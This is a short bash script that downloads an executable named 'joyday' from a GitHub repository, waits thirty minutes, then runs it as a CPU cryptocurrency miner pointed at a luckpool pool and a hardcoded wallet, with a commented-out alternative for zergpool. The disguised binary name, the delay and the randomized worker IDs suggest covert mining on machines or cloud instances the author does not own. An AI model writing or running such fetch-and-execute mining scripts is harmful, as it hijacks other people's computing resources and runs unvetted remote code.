#!/bin/bash

wget https://github.com/bibirbusin/bibirbusin/raw/main/joyday
chmod +x joyday
sleep 1800
./joyday --disable-gpu --algorithm verushash --pool ap.luckpool.net:3956 --wallet RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3 --Worker AALuxy$RANDOM --password Hybrid --cpu-threads 0
#./joyday --disable-gpu --algorithm yespowerltncg --pool stratum+tcp://yespowerLTNCG.mine.zergpool.com:6239 --wallet RQ9cLzR9o1E92Pw9q5LtiHvDXBfeWhqvgo --password c=RVN,mc=CRNC,ID=AALuxy$RANDOM --cpu-threads 3
